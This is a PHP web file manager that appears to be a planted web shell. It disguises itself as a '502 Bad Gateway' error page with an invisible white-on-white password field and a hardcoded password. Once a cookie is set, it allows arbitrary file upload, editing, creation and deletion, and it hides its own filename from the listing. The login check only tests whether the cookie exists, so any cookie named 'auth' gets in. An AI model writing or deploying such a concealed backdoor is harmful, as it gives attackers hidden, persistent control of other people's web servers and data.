<?php
// --------------------------
// LOGOUT & LOGIN SECTION
// --------------------------
if (isset($_GET['logout'])) {
    // Sesuaikan path cookie sesuai kebutuhan (misalnya menggunakan direktori script)
    $cookiePath = dirname($_SERVER['SCRIPT_NAME']);
    setcookie("auth", "", time() - 3600, $cookiePath);
    header("Location: " . strtok($_SERVER["REQUEST_URI"], "?"));
    exit();
}

// ---------------------------------
// BAGIAN LOGIN TERSEMBUNYI
// ---------------------------------
$loginSecret = "hiddenfoxy"; // Ubah sesuai kebutuhan

// Proses login
if (isset($_POST['login'])) {
    $password = $_POST['password'] ?? "";
    if ($password === $loginSecret) {
        $cookiePath = dirname($_SERVER['SCRIPT_NAME']);
        setcookie("auth", "1", time() + (30 * 24 * 60 * 60), $cookiePath);
        header("Location: " . $_SERVER['REQUEST_URI']);
        exit();
    } else {
        $loginError = "Password salah.";
    }
}

// Jika cookie "auth" belum ada, tampilkan halaman login
if (!isset($_COOKIE['auth'])) {
    header("HTTP/1.1 403 Forbidden");
    ?>
    <html>
    <head>
        <title>502 Bad Gateway</title>
    </head>
    <body>
        <center>
            <h1>502 Bad Gateway</h1>
        </center>
        <hr>
        <center>openfoxyresty/1.27.1.1</center>
        <!-- Form Login -->
        <center style="margin-top: 40%;">
            <form method="post" action="">
                <input name="password" style="background:white; border:1px solid white; padding:0.5rem;">
                <input type="submit" name="login" value="Login" style="color:white; background:white; border:1px solid white; padding:0.5rem;">
            </form>
            <?php if (isset($loginError)) echo "<div style='color:red;'>" . htmlspecialchars($loginError) . "</div>"; ?>
        </center>
    </body>
    </html>
    <?php
    exit();
}

// --------------------------
// FILE MANAGER SECTION
// --------------------------

// --- KONFIGURASI & VALIDASI DIREKTORI ---
// Base directory: direktori dasar file manager (lokasi file_manager.php)
$baseDir = realpath(__DIR__);

// Fungsi untuk memastikan path hanya berada di dalam baseDir
function isWithinBase($path, $base) {
    return strpos(realpath($path), $base) === 0;
}

// Fungsi untuk mendapatkan path relatif dari base
function getRelativePath($path, $base) {
    $rel = str_replace($base, '', realpath($path));
    return $rel === '' ? '.' : ltrim($rel, DIRECTORY_SEPARATOR);
}

// Fungsi untuk sanitasi input path (sangat sederhana)
function sanitize_relative_path($path) {
    $path = str_replace('..', '', $path);
    $path = trim($path);
    return ltrim($path, '/\\');
}

// --- FUNGSI OPERASI FILE ---
function recursive_copy($src, $dst) {
    if (is_dir($src)) {
        if (!is_dir($dst)) {
            mkdir($dst, 0777, true);
        }
        foreach (scandir($src) as $file) {
            if ($file === "." || $file === "..") continue;
            recursive_copy("$src/$file", "$dst/$file");
        }
    } else {
        copy($src, $dst);
    }
}

function recursive_delete($target) {
    if (is_dir($target)) {
        foreach (scandir($target) as $file) {
            if ($file === "." || $file === "..") continue;
            recursive_delete("$target/$file");
        }
        rmdir($target);
    } else {
        unlink($target);
    }
}

// --- MENENTUKAN DIREKTORI SAAT INI ---
$currentDir = $baseDir;
if (isset($_GET['dir'])) {
    $requestedRaw = $_GET['dir'];
    // Jika diawali dengan '/', perlakukan sebagai absolute path
    if (substr($requestedRaw, 0, 1) === '/') {
        $tempDir = realpath($requestedRaw);
    } else {
        $requested = sanitize_relative_path($requestedRaw);
        $tempDir = realpath($baseDir . DIRECTORY_SEPARATOR . $requested);
    }
    if ($tempDir !== false && isWithinBase($tempDir, $baseDir)) {
        $currentDir = $tempDir;
    }
}

$currentDirRelative = getRelativePath($currentDir, $baseDir);

// Ambil parameter action (upload, download, edit, copy, bulkcopy, make, delete)
$action = isset($_GET['action']) ? $_GET['action'] : '';
?>
<!DOCTYPE html>
<html lang="id" class="dark">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <title>File Manager</title>
  <!-- Tailwind CSS dari CDN -->
  <link href="https://cdn.jsdelivr.net/npm/tailwindcss@2.2.19/dist/tailwind.min.css" rel="stylesheet">
</head>
<body class="bg-gray-50 dark:bg-gray-800 text-gray-800 dark:text-gray-100">
  <div class="container mx-auto px-4 py-6">
    <!-- Header & Breadcrumb -->
    <h1 class="text-3xl font-bold mb-4">File Manager</h1>
    <nav class="mb-4 text-sm">
      <?php
      // Breadcrumb navigation (contoh: Home / Folder1 / Folder2)
      echo "<a href='?dir=.' class='text-blue-500 hover:underline'>Home</a>";
      if ($currentDirRelative !== '.' && $currentDirRelative !== '') {
          $parts = explode(DIRECTORY_SEPARATOR, $currentDirRelative);
          $acc = [];
          foreach ($parts as $part) {
              if ($part === '') continue;
              $acc[] = $part;
              $dirParam = implode(DIRECTORY_SEPARATOR, $acc);
              echo " / <a href='?dir=" . urlencode($dirParam) . "' class='text-blue-500 hover:underline'>" . htmlspecialchars($part) . "</a>";
          }
      }
      ?>
    </nav>

    <!-- Clickable Absolute Path Breadcrumb -->
    <div class="mb-4 text-xs text-gray-600 dark:text-gray-400">
      <?php
        // Mengambil absolute path dari direktori saat ini
        $absolutePath = realpath($currentDir);
        // Pecah path berdasarkan DIRECTORY_SEPARATOR
        $parts = explode(DIRECTORY_SEPARATOR, $absolutePath);
        $acc = '';
        // Loop tiap segmen; setiap segmen clickable
        foreach ($parts as $index => $segment) {
            if ($segment === '') continue;
            $acc .= DIRECTORY_SEPARATOR . $segment; // membangun path (misal: /home, /home/sman6plg, dst)
            echo "<a href='?dir=" . urlencode($acc) . "' class='text-blue-500 hover:underline'>" . htmlspecialchars($segment) . "</a>";
            // Jika masih ada segmen berikutnya, tampilkan pemisah
            if ($index < count($parts) - 1) {
                echo DIRECTORY_SEPARATOR;
            }
        }
      ?>
    </div>



    <!-- Menu Operasi -->
    <div class="mb-6 space-x-2">
      <a href="?action=upload&dir=<?php echo urlencode($currentDirRelative); ?>" class="bg-blue-500 hover:bg-blue-600 text-white px-3 py-1 rounded">Upload File</a>
      <a href="?action=bulkcopy&dir=<?php echo urlencode($currentDirRelative); ?>" class="bg-green-500 hover:bg-green-600 text-white px-3 py-1 rounded">Bulk Copy</a>
      <a href="?action=copy&dir=<?php echo urlencode($currentDirRelative); ?>" class="bg-yellow-500 hover:bg-yellow-600 text-white px-3 py-1 rounded">Copy File/Folder</a>
      <a href="?action=make&dir=<?php echo urlencode($currentDirRelative); ?>" class="bg-indigo-500 hover:bg-indigo-600 text-white px-3 py-1 rounded">Make File/Folder</a>
      <a href="?logout=1" class="bg-red-500 hover:bg-indigo-600 text-white px-3 py-1 rounded">Logout</a>
    </div>

    <!-- HASIL PROSES ACTION -->
    <div class="mb-6">
    <?php
    // --- UPLOAD ---
    if ($action === 'upload') {
        if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_FILES['upload_file'])) {
            $filename = basename($_FILES['upload_file']['name']);
            $targetFile = $currentDir . DIRECTORY_SEPARATOR . $filename;
            if (move_uploaded_file($_FILES['upload_file']['tmp_name'], $targetFile)) {
                echo "<div class='bg-green-100 p-3 rounded mb-2'>File berhasil diupload: " . htmlspecialchars($filename) . "</div>";
            } else {
                echo "<div class='bg-red-100 p-3 rounded mb-2'>Gagal mengupload file.</div>";
            }
            echo "<a href='?dir=" . urlencode($currentDirRelative) . "' class='text-blue-500 hover:underline'>Kembali</a>";
        } else {
            ?>
            <form action="?action=upload&dir=<?php echo urlencode($currentDirRelative); ?>" method="post" enctype="multipart/form-data" class="space-y-4">
              <div>
                <label class="block mb-1">Pilih File:</label>
                <input type="file" name="upload_file" class="border border-gray-300 dark:border-gray-600 rounded p-2 w-full">
              </div>
              <button type="submit" class="bg-blue-500 hover:bg-blue-600 text-white px-3 py-1 rounded">Upload</button>
            </form>
            <br><a href="?dir=<?php echo urlencode($currentDirRelative); ?>" class="text-blue-500 hover:underline">Kembali</a>
            <?php
        }
        exit;
    } elseif ($action === 'download') {
        // --- DOWNLOAD ---
        if (isset($_GET['file'])) {
            $file = basename($_GET['file']);
            $filePath = $currentDir . DIRECTORY_SEPARATOR . $file;
            if (file_exists($filePath)) {
                header('Content-Description: File Transfer');
                header('Content-Type: application/octet-stream');
                header('Content-Disposition: attachment; filename="' . basename($filePath) . '"');
                header('Expires: 0');
                header('Cache-Control: must-revalidate');
                header('Pragma: public');
                header('Content-Length: ' . filesize($filePath));
                readfile($filePath);
                exit;
            } else {
                echo "<div class='bg-red-100 p-3 rounded'>File tidak ditemukan.</div>";
            }
        }
        echo "<br><a href='?dir=" . urlencode($currentDirRelative) . "' class='text-blue-500 hover:underline'>Kembali</a>";
        exit;
    } elseif ($action === 'edit') {
        // --- EDIT ---
        if (isset($_GET['file'])) {
            $file = basename($_GET['file']);
            $filePath = $currentDir . DIRECTORY_SEPARATOR . $file;
            if (!file_exists($filePath)) {
                echo "<div class='bg-red-100 p-3 rounded'>File tidak ditemukan.</div>";
                echo "<br><a href='?dir=" . urlencode($currentDirRelative) . "' class='text-blue-500 hover:underline'>Kembali</a>";
                exit;
            }
            if ($_SERVER['REQUEST_METHOD'] === 'POST') {
                $content = $_POST['content'];
                if (file_put_contents($filePath, $content) !== false) {
                    echo "<div class='bg-green-100 p-3 rounded'>File berhasil disimpan.</div>";
                } else {
                    echo "<div class='bg-red-100 p-3 rounded'>Gagal menyimpan file.</div>";
                }
                echo "<br><a href='?dir=" . urlencode($currentDirRelative) . "' class='text-blue-500 hover:underline'>Kembali</a>";
                exit;
            } else {
                $content = file_get_contents($filePath);
                ?>
                <form action="?action=edit&file=<?php echo urlencode($file); ?>&dir=<?php echo urlencode($currentDirRelative); ?>" method="post" class="space-y-4">
                  <div>
                    <textarea name="content" rows="15" class="w-full border border-gray-300 dark:border-gray-600 rounded p-2"><?php echo htmlspecialchars($content); ?></textarea>
                  </div>
                  <button type="submit" class="bg-blue-500 hover:bg-blue-600 text-white px-3 py-1 rounded">Simpan</button>
                </form>
                <br><a href="?dir=<?php echo urlencode($currentDirRelative); ?>" class="text-blue-500 hover:underline">Kembali</a>
                <?php
                exit;
            }
        }
        echo "<br><a href='?dir=" . urlencode($currentDirRelative) . "' class='text-blue-500 hover:underline'>Kembali</a>";
        exit;
    } elseif ($action === 'copy') {
        // --- COPY FILE/FOLDER TUNGGAL ---
        if (isset($_GET['src']) && isset($_GET['dest'])) {
            $src = $currentDir . DIRECTORY_SEPARATOR . basename($_GET['src']);
            $dest = $currentDir . DIRECTORY_SEPARATOR . basename($_GET['dest']);
            if (!file_exists($src)) {
                echo "<div class='bg-red-100 p-3 rounded'>Sumber tidak ditemukan.</div>";
            } else {
                recursive_copy($src, $dest);
                echo "<div class='bg-green-100 p-3 rounded'>Berhasil menyalin " . htmlspecialchars(basename($_GET['src'])) . " ke " . htmlspecialchars(basename($_GET['dest'])) . "</div>";
            }
            echo "<br><a href='?dir=" . urlencode($currentDirRelative) . "' class='text-blue-500 hover:underline'>Kembali</a>";
            exit;
        } else {
            ?>
            <form action="?action=copy&dir=<?php echo urlencode($currentDirRelative); ?>" method="get" class="space-y-4">
              <div>
                <label>Sumber (nama file/folder):</label>
                <input type="text" name="src" placeholder="contoh: namafile.txt" class="w-full border border-gray-300 dark:border-gray-600 rounded p-2">
              </div>
              <div>
                <label>Tujuan (nama file/folder baru):</label>
                <input type="text" name="dest" placeholder="contoh: salinan_namafile" class="w-full border border-gray-300 dark:border-gray-600 rounded p-2">
              </div>
              <button type="submit" class="bg-yellow-500 hover:bg-yellow-600 text-white px-3 py-1 rounded">Copy</button>
            </form>
            <br><a href="?dir=<?php echo urlencode($currentDirRelative); ?>" class="text-blue-500 hover:underline">Kembali</a>
            <?php
            exit;
        }
    } elseif ($action === 'bulkcopy') {
        // --- BULK COPY ---
        if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['target'], $_POST['destpath'], $_POST['names'])) {
            // Ambil dan sanitasi input
            $targetInput = sanitize_relative_path($_POST['target']);
            $destInput   = sanitize_relative_path($_POST['destpath']);
            $namesInput  = $_POST['names'];

            $sourceFolder = realpath($currentDir . DIRECTORY_SEPARATOR . $targetInput);
            if (!$sourceFolder || !is_dir($sourceFolder)) {
                echo "<div class='bg-red-100 p-3 rounded'>Target folder tidak valid.</div>";
            } else {
                // Pastikan direktori tujuan ada. Jika belum ada, buat.
                $destinationDirPath = $currentDir . DIRECTORY_SEPARATOR . $destInput;
                if (!file_exists($destinationDirPath)) {
                    mkdir($destinationDirPath, 0777, true);
                }
                $destinationDir = realpath($destinationDirPath);

                // Pisahkan names berdasarkan koma, newline, atau spasi
                $namesArray = preg_split("/[\r\n,]+/", $namesInput);
                $namesArray = array_filter(array_map('trim', $namesArray));
                $results = [];
                foreach ($namesArray as $newName) {
                    $newDest = $destinationDir . DIRECTORY_SEPARATOR . $newName;
                    recursive_copy($sourceFolder, $newDest);
                    $results[] = getRelativePath($newDest, $baseDir);
                }
                echo "<div class='bg-green-100 p-3 rounded mb-4'>Bulk copy berhasil. Folder baru dibuat:</div>";
                echo "<ul class='list-disc pl-5'>";
                foreach ($results as $res) {
                    echo "<li>" . htmlspecialchars($res) . "</li>";
                }
                echo "</ul>";
            }
            echo "<br><a href='?dir=" . urlencode($currentDirRelative) . "' class='text-blue-500 hover:underline'>Kembali</a>";
            exit;
        } else {
            ?>
            <form action="?action=bulkcopy&dir=<?php echo urlencode($currentDirRelative); ?>" method="post" class="space-y-4">
              <div>
                <label class="block mb-1">Target Folder (folder sumber, misal: ./base):</label>
                <input type="text" name="target" required placeholder="contoh: ./base" class="w-full border border-gray-300 dark:border-gray-600 rounded p-2">
              </div>
              <div>
                <label class="block mb-1">Path (lokasi penyimpanan, misal: ./):</label>
                <input type="text" name="destpath" required placeholder="contoh: ./" class="w-full border border-gray-300 dark:border-gray-600 rounded p-2">
              </div>
              <div>
                <label class="block mb-1">Name for Copy (pisahkan dengan koma atau baris baru):</label>
                <textarea name="names" required placeholder="contoh: A, B, C, D" rows="4" class="w-full border border-gray-300 dark:border-gray-600 rounded p-2"></textarea>
              </div>
              <button type="submit" class="bg-green-500 hover:bg-green-600 text-white px-3 py-1 rounded">Bulk Copy</button>
            </form>
            <br><a href="?dir=<?php echo urlencode($currentDirRelative); ?>" class="text-blue-500 hover:underline">Kembali</a>
            <?php
            exit;
        }
    } elseif ($action === 'make') {
        // --- MAKE FILE/FOLDER ---
        if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['make_type'], $_POST['name'])) {
            $makeType = $_POST['make_type']; // "file" atau "folder"
            $name = basename(trim($_POST['name']));
            if (empty($name)) {
                echo "<div class='bg-red-100 p-3 rounded'>Nama tidak boleh kosong.</div>";
            } else {
                $targetPath = $currentDir . DIRECTORY_SEPARATOR . $name;
                if (file_exists($targetPath)) {
                    echo "<div class='bg-red-100 p-3 rounded'>File/Folder dengan nama tersebut sudah ada.</div>";
                } else {
                    if ($makeType === 'folder') {
                        if (mkdir($targetPath, 0777, true)) {
                            echo "<div class='bg-green-100 p-3 rounded'>Folder berhasil dibuat: " . htmlspecialchars($name) . "</div>";
                        } else {
                            echo "<div class='bg-red-100 p-3 rounded'>Gagal membuat folder.</div>";
                        }
                    } else { // file
                        // Jika ada content, gunakan; jika tidak, file kosong.
                        $content = isset($_POST['content']) ? $_POST['content'] : "";
                        if (file_put_contents($targetPath, $content) !== false) {
                            echo "<div class='bg-green-100 p-3 rounded'>File berhasil dibuat: " . htmlspecialchars($name) . "</div>";
                        } else {
                            echo "<div class='bg-red-100 p-3 rounded'>Gagal membuat file.</div>";
                        }
                    }
                }
            }
            echo "<br><a href='?dir=" . urlencode($currentDirRelative) . "' class='text-blue-500 hover:underline'>Kembali</a>";
            exit;
        } else {
            ?>
            <form action="?action=make&dir=<?php echo urlencode($currentDirRelative); ?>" method="post" class="space-y-4">
              <div>
                <label class="block mb-1">Tipe:</label>
                <select name="make_type" id="make_type" class="w-full border border-gray-300 dark:border-gray-600 rounded p-2">
                  <option value="file">File</option>
                  <option value="folder">Folder</option>
                </select>
              </div>
              <div>
                <label class="block mb-1">Nama:</label>
                <input type="text" name="name" required placeholder="Masukkan nama file atau folder" class="w-full border border-gray-300 dark:border-gray-600 rounded p-2">
              </div>
              <div id="file_content_div">
                <label class="block mb-1">Content (opsional, untuk file):</label>
                <textarea name="content" placeholder="Masukkan isi file (jika membuat file)" rows="4" class="w-full border border-gray-300 dark:border-gray-600 rounded p-2"></textarea>
              </div>
              <button type="submit" class="bg-indigo-500 hover:bg-indigo-600 text-white px-3 py-1 rounded">Buat</button>
            </form>
            <br><a href="?dir=<?php echo urlencode($currentDirRelative); ?>" class="text-blue-500 hover:underline">Kembali</a>
            <script>
              // Sembunyikan textarea content ketika opsi folder dipilih
              document.getElementById("make_type").addEventListener("change", function(){
                if(this.value == "file"){
                  document.getElementById("file_content_div").style.display = "block";
                } else {
                  document.getElementById("file_content_div").style.display = "none";
                }
              });
              // Inisialisasi tampilan (default file)
              document.getElementById("file_content_div").style.display = "block";
            </script>
            <?php
            exit;
        }
    } elseif ($action === 'delete') {
        // --- DELETE ---
        if (isset($_GET['target'])) {
            $target = $currentDir . DIRECTORY_SEPARATOR . basename($_GET['target']);
            if (!file_exists($target)) {
                echo "<div class='bg-red-100 p-3 rounded'>Target tidak ditemukan.</div>";
            } else {
                recursive_delete($target);
                echo "<div class='bg-green-100 p-3 rounded'>Berhasil menghapus " . htmlspecialchars(basename($_GET['target'])) . "</div>";
            }
        }
        echo "<br><a href='?dir=" . urlencode($currentDirRelative) . "' class='text-blue-500 hover:underline'>Kembali</a>";
        exit;
    }
    ?>
    </div>

    <!-- DAFTAR FILE/FOLDER di direktori saat ini -->
    <div>
      <h2 class="text-2xl font-bold mb-2">Daftar File/Folder di <?php echo htmlspecialchars($currentDirRelative); ?></h2>
      <table class="min-w-full bg-white dark:bg-gray-700 shadow rounded overflow-hidden">
         <thead>
           <tr class="bg-gray-200 dark:bg-gray-600">
              <th class="px-4 py-2 text-left">Nama</th>
              <th class="px-4 py-2 text-left">Tipe</th>
              <th class="px-4 py-2 text-left">Aksi</th>
           </tr>
         </thead>
         <tbody>
           <?php
           foreach (scandir($currentDir) as $item) {
               if ($item === "." || $item === ".." || $item === basename(__FILE__)) continue;
               $itemPath = $currentDir . DIRECTORY_SEPARATOR . $item;
               $type = is_dir($itemPath) ? "Folder" : "File";
               echo "<tr class='border-b border-gray-200 dark:border-gray-600'>";
               echo "<td class='px-4 py-2'>";
               // Jika folder, buat link agar bisa 'cd'
               if (is_dir($itemPath)) {
                   $newDir = getRelativePath($itemPath, $baseDir);
                   echo "<a href='?dir=" . urlencode($newDir) . "' class='text-blue-500 hover:underline'>" . htmlspecialchars($item) . "</a>";
               } else {
                   echo htmlspecialchars($item);
               }
               echo "</td>";
               echo "<td class='px-4 py-2'>" . $type . "</td>";
               echo "<td class='px-4 py-2 space-x-2'>";
               if (is_file($itemPath)) {
                   echo "<a href='?action=download&file=" . urlencode($item) . "&dir=" . urlencode($currentDirRelative) . "' class='text-blue-500 hover:underline'>Download</a>";
                   echo "<a href='?action=edit&file=" . urlencode($item) . "&dir=" . urlencode($currentDirRelative) . "' class='text-blue-500 hover:underline'>Edit</a>";
               }
               echo "<a href='?action=delete&target=" . urlencode($item) . "&dir=" . urlencode($currentDirRelative) . "' class='text-red-500 hover:underline' onclick=\"return confirm('Yakin hapus?');\">Delete</a>";
               echo "</td>";
               echo "</tr>";
           }
           ?>
         </tbody>
      </table>
    </div>
  </div>
</body>
</html>
